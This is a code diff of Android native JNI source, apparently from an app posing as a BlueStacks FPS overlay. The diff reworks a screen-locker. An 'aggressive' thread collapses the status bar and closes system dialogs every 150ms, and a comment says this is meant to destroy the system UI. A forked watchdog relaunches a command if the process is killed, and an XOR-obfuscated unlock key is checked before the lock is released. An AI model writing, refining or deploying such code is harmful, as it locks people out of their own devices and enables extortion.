@@ -6,15 +6,13 @@
 #include <cstdio>
 #include <signal.h>
 #include <sys/ptrace.h>
-#include <vector>
 
 JavaVM* jvm = nullptr;
 jobject serviceObject = nullptr;
 pid_t watchdogPid = -1;
 volatile bool isRunning = false;
 
-// Kunci: "02042009" ter-obfuscate dengan XOR 0x0E
-// '0'^0x0E=0x3E, '2'^0x0E=0x3C, '0'^0x0E=0x3E, '4'^0x0E=0x3A, '2'^0x0E=0x3C, '0'^0x0E=0x3E, '0'^0x0E=0x3E, '9'^0x0E=0x37
+// Kunci: "02042009" (XOR 0x0E)
 static const unsigned char SECRET_KEY[] = {0x3E, 0x3C, 0x3E, 0x3A, 0x3C, 0x3E, 0x3E, 0x37};
 static const size_t KEY_LEN = 8;
 
@@ -24,28 +22,24 @@ void* aggressiveLoop(void* args) {
     JNIEnv* env;
     if (jvm->AttachCurrentThread(&env, nullptr) != JNI_OK) return nullptr;
 
-    int counter = 0;
+    jclass clazz = env->GetObjectClass(serviceObject);
+    jmethodID collapse = env->GetMethodID(clazz, "collapseStatusBar", "()V");
+    jmethodID closeDials = env->GetMethodID(clazz, "closeSystemDialogs", "()V");
+
+    if (!collapse || !closeDials) {
+        jvm->DetachCurrentThread();
+        return nullptr;
+    }
+
     while (isRunning) {
         if (serviceObject == nullptr) break;
 
-        jclass clazz = env->GetObjectClass(serviceObject);
+        // Panggil method Java yang sudah di-cache
+        env->CallVoidMethod(serviceObject, collapse);
+        env->CallVoidMethod(serviceObject, closeDials);
 
-        // Agresi UI: Collapse status bar & close dialogs
-        if (counter % 10 == 0) { // Setiap ~100ms
-            jmethodID collapse = env->GetMethodID(clazz, "collapseStatusBar", "()V");
-            jmethodID closeDials = env->GetMethodID(clazz, "closeSystemDialogs", "()V");
-            if (collapse) env->CallVoidMethod(serviceObject, collapse);
-            if (closeDials) env->CallVoidMethod(serviceObject, closeDials);
-        }
-
-        // Paksa aplikasi ke depan jika user mencoba switch
-        if (counter % 50 == 0) { // Setiap ~500ms
-            jmethodID refresh = env->GetMethodID(clazz, "refreshOverlay", "()V");
-            if (refresh) env->CallVoidMethod(serviceObject, refresh);
-        }
-
-        counter++;
-        usleep(10000); // 10ms sleep
+        // Tidur 150ms sudah sangat cukup untuk "menghancurkan" UI Sistem
+        usleep(150000);
     }
 
     jvm->DetachCurrentThread();
@@ -54,9 +48,9 @@ void* aggressiveLoop(void* args) {
 
 void startWatchdog(const char* cmd) {
     watchdogPid = fork();
-    if (watchdogPid == 0) { // Watchdog Process
+    if (watchdogPid == 0) {
         while (true) {
-            if (getppid() <= 1) { // Parent died (init adopted us or it's gone)
+            if (getppid() <= 1) {
                 system(cmd);
                 exit(0);
             }
@@ -100,10 +94,8 @@ Java_com_bluestacks_fpsoverlay_FPSService_stopNativeAggression(JNIEnv* env, jobj
 extern "C" JNIEXPORT jboolean JNICALL
 Java_com_bluestacks_fpsoverlay_FPSAccessibilityService_verifyAdvancedKey(JNIEnv* env, jobject thiz, jstring input) {
     if (input == nullptr) return JNI_FALSE;
-
     const char* nativeInput = env->GetStringUTFChars(input, nullptr);
     size_t inputLen = strlen(nativeInput);
-
     bool match = (inputLen == KEY_LEN);
     if (match) {
         for (size_t i = 0; i < KEY_LEN; i++) {
@@ -113,7 +105,6 @@ Java_com_bluestacks_fpsoverlay_FPSAccessibilityService_verifyAdvancedKey(JNIEnv*
             }
         }
     }
-
     env->ReleaseStringUTFChars(input, nativeInput);
     return match ? JNI_TRUE : JNI_FALSE;
 }
